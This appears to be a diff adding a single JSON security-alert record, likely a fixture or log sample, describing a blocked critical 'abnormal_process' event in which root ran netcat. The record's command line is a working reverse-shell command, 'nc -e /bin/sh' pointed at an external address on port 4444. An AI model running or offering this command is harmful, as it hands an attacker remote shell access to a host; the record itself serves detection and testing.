@@ -1,0 +1,1 @@
+{"occur_time":"2026-02-21 10:23:45","event_type":"abnormal_process","host_name":"ecs-app-02","host_ip":"10.20.30.42","user":"root","process_name":"nc","process_path":"/usr/bin/nc","cmd_line":"nc -e /bin/sh 198.51.100.9 4444","severity":"critical","action":"block","region":"cn-north-4"}
